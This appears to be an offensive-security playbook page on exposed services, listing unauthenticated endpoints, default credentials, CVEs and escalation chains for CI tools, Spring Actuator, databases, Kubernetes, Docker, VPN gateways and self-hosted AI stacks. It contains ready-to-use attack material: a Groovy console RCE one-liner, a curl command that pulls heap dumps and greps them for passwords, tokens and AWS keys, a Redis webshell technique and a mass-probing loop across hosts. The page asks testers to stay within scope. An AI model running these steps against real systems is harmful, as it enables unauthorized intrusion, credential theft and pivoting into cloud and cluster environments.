# Exposed Services — Per-Service Unauth Check + Escalation

> The gold mine. From `probe.json` + `ports.naabu`, every service below has a **no-auth read** or **anon-RCE** path. A login page is not a finding — click through to the anonymous surface. Confirm reachability; escalate only within scope.

**How to use:** fingerprint (title/tech/port) → jump to the service → run the *unauth check* → if it returns data/console, follow *escalation*. CVE specifics live in `preauth-cves.md`.

---

## CI / CD / Dev (highest RCE density)

### Jenkins  `:8080`, title "Dashboard [Jenkins]"
```
/script                     → Groovy console (anon RCE if enabled): print "id".execute().text
/asynchPeople/              → user list
/env-vars.html /systemInfo  → env (secrets)
/credentials/               → stored creds (sometimes decryptable)
/jnlpJars/jenkins-cli.jar   → CLI → CVE-2024-23897 arbitrary file read → secret → RCE chain
/view/all/newJob            → job creation → build step RCE
```
**Escalation:** `/script` = instant RCE. Else CVE-2024-23897 read `secrets/master.key`+`hudson.util.Secret` → decrypt creds → RCE.

### TeamCity `:8111`
`/login.html` version → **CVE-2024-27198/27199** auth bypass → create admin token → RCE via build step.

### GoCD `:8153`, Drone, Concourse, Argo
```
Argo CD        /api/v1/applications (anon?) ; misconfig → app of apps → cluster
Argo Workflows /api/v1/workflows/<ns> (anon submit → container RCE)
GoCD           /go/pipelines ; CVE-2021-43287 (secret via agent API)
```

### Airflow `:8080`, title "Airflow"
```
/api/v1/dags                      → DAG list (anon?)
/admin/airflow/dag_code?dag_id=x  → DAG source (secrets)
```
CVE-2022-40127 example-DAG code injection → RCE. **Zeppelin** `/#/notebook` → Shell interpreter → RCE.

---

## Spring Boot Actuator  (tech "Spring", whitelabel error)
```
/actuator            → index of exposed endpoints
/actuator/env        → config + secrets (DB pw, cloud keys — often masked, sometimes not)
/actuator/heapdump   → **download heap → grep creds/tokens/sessions** (huge)
/actuator/health, /mappings, /configprops, /beans, /threaddump, /loggers
/actuator/jolokia    → JMX over HTTP → MBean RCE (Logback JNDI, reloadByURL)
/actuator/gateway/routes → Spring Cloud Gateway → CVE-2022-22947 SpEL RCE
```
```bash
curl -s "$H/actuator/heapdump" -o hd.bin && strings hd.bin | grep -iE 'password|secret|token|aws_|bearer'
```
**Escalation:** heapdump creds → DB/cloud pivot; jolokia/gateway → RCE.

---

## Search / Data stores (mass-PII + RCE) — also see cloud-storage.md §6

```
Elasticsearch :9200   /_cat/indices?v   /_search?q=*   (no auth default) → mass PII
Kibana        :5601   /api/status ; app/dev_tools console (proxies ES)
MongoDB       :27017  no auth → listDatabases → dump
Redis         :6379   PING/INFO no AUTH → CONFIG SET dir → webshell/SSH key → RCE
Memcached     :11211  stats ; get <key>
CouchDB       :5984   /_all_dbs ; CVE-2017-12635 admin creation → RCE via _config
Cassandra 9042 · RethinkDB 8080 · Neo4j 7474 (/browser, default neo4j:neo4j) · InfluxDB 8086
Solr          :8983   /solr/#/ ; VelocityResponseWriter SSTI (CVE-2019-17558) → RCE
Druid         :8888   /unified-console.html → JS/SQL → CVE-2021-25646 RCE
Prometheus    :9090   /graph ; /-/metrics (topology leak) · Grafana :3000 (CVE-2021-43798 path traversal)
```

---

## Orchestration / infra / secrets

```
Kubernetes API :6443/:8443/:10250  /api/v1/namespaces (anonymous?) ; kubelet :10250/pods,/run → RCE
etcd        :2379  /v2/keys/?recurse ; /version   → cluster secrets
Consul      :8500  /v1/kv/?recurse ; /v1/agent/self ; script checks → RCE
Nomad       :4646  /v1/jobs (anon submit → RCE)
Vault       :8200  /v1/sys/health (sealed?) ; /v1/sys/config/state (misconfig)
Docker API  :2375  /version /containers/json → docker run → host RCE
Rancher :443 · Portainer :9000 (admin-init race) · Kubeflow · Harbor (CVE-2022-46463 anon pull)
RabbitMQ mgmt :15672 (guest:guest) · Kafka :9092 · Zookeeper :2181 (`stat`, `dump`)
```

---

## Repos / registries / artifacts (source + secrets + dep-confusion)

```
GitLab   /explore ; /-/users/sign_in (version) ; public projects → secrets
Gitea/Gogs  /explore/repos  · Gerrit /a/  · SonarQube :9000 (admin:admin, /api/settings)
Nexus :8081 /service/rest/v1/search  · Artifactory :8081 /artifactory/api/repositories
Harbor /api/v2.0/projects  · Docker Registry :5000 /v2/_catalog → pull → trufflehog
npm/verdaccio, PyPI mirror, crates mirror → internal package names → dependency-confusion.md
```

---

## Message/observability/misc

```
Grafana :3000  /api/datasources (anon org?) ; /public/plugins?... CVE-2021-43798 → /etc/passwd, grafana.db
Kibana  :5601  /app/kibana#/dev_tools/console
Jaeger :16686 · Graylog :9000 · Kibana · Alertmanager :9093
Swagger  /swagger-ui.html /v2/api-docs /v3/api-docs /openapi.json → full API contract (BOLA seed)
GraphQL  /graphql /api/graphql (introspection → BOLA)  (see top10-unauth.md §8)
phpMyAdmin /phpmyadmin (root:blank) · Adminer · pgAdmin
```

---

## Edge / VPN / gateway (2025 breach class → preauth-cves.md TIER 0/1)

```
Citrix NetScaler  /vpn/index.html /logon/LogonPoint  → CitrixBleed CVE-2023-4966 / 2025-5777 session hijack
Fortinet          /remote/login → CVE-2024-21762 / 2024-55591
F5 BIG-IP         /tmui/login.jsp → CVE-2022-1388 / 2023-46747
Ivanti CS         /dana-na/... → CVE-2025-0282
Palo Alto GP      /global-protect/login.esp → CVE-2024-3400
SonicWall /cgi-bin/ · Pulse · Zoho ManageEngine (CVE-2022-47966 SAML RCE, many products)
MOVEit /human.aspx · GoAnywhere /goanywhere · PaperCut :9191
```

---

## AI / ML infrastructure (2025–2026 initial-access class — unauth RCE)

Self-hosted AI stacks ship with **no auth by default** and get exposed directly. Fast-growing initial-access vector; Langflow RCE was weaponized within 20 hours of disclosure. Fingerprint by title/port/path.

```
Langflow    :7860  → /api/v1/validate/code (CVE-2025-34291 unauth code exec+ATO)
                     /api/v1/build_public_tmp/{flow_id}/flow (CVE-2026-33017 unauth Python RCE)
                     /api/v1/process (CVE-2026-5027 deserialization RCE, CVSS 9.8)
Flowise     :3000  → /api/v1/ (auth often disabled) → chatflow node → command exec
Dify        :5001/:3000 → exposed console/api, workspace takeover
ComfyUI     :8188  → no auth; custom-node / workflow → arbitrary file + code exec (35k+ exposed)
Ollama      :11434 → NO auth by design → /api/tags, /api/pull, /api/generate ; CVE-2024-37032 (path traversal RCE), model-pull SSRF
vLLM        :8000  → /v1/models, /v1/completions unauth ; some builds deserialization RCE
llama.cpp   :8080  → /completion unauth (compute abuse + DoS, no input cap)
MLflow      :5000  → /api/2.0/mlflow/experiments/list ; CVE-2023-6014/2024 LFI+RCE via artifact path traversal
Kubeflow    :8080  → pipelines UI, notebook servers → cluster RCE
Ray         :8265  → dashboard /api/jobs → job submit = unauth RCE (CVE-2023-48022 "ShadowRay", disputed but live-exploited)
Triton / TorchServe :8080 → model management API → model upload RCE
Gradio apps        → /file= path traversal (CVE-2024-1561), /upload
Jupyter     :8888  → no-token notebook → instant RCE ; /api/kernels
```
**Escalation:** unauth RCE → steal API keys / model weights / cloud creds from env → pivot (→ secrets-recon.md). Even without RCE: open inference endpoint = free-compute abuse + input-uncapped DoS + full API-contract disclosure via `/openapi.json`. Route prompt-injection/model-abuse to `prompt-injection-hunter-agent`; the *infra* RCE stays here.

## Systematic sweep

```bash
# 1. Every non-80/443 HTTP service deserves a manual visit
awk '{print $1}' ports.naabu | sort -u | httpx -silent -title -tech-detect -status-code

# 2. Screenshot for fast visual triage — default branding = jackpot
gowitness file -f alive.txt -P shots/

# 3. Anon probe the highest-value paths across all hosts
for H in $(cat alive.txt); do
  for p in script actuator/heapdump _cat/indices "v1/kv/?recurse" api/v1/namespaces \
           v2/_catalog "solr/admin/cores?wt=json" api/datasources graphql swagger-ui.html; do
    code=$(curl -sk -o /dev/null -w '%{http_code}' -m 8 "$H/$p")
    [ "$code" = 200 ] && echo "200 $H/$p"
  done
done | tee svc.hits
```

**Escalation ladder (universal):** anon read → config/secrets → creds → DB/cloud pivot → RCE.
Confirm reachability + one proof (`id`, index count, one record). Do not dump, do not pivot beyond proof. Report each as its own P1/P2 or chain them.
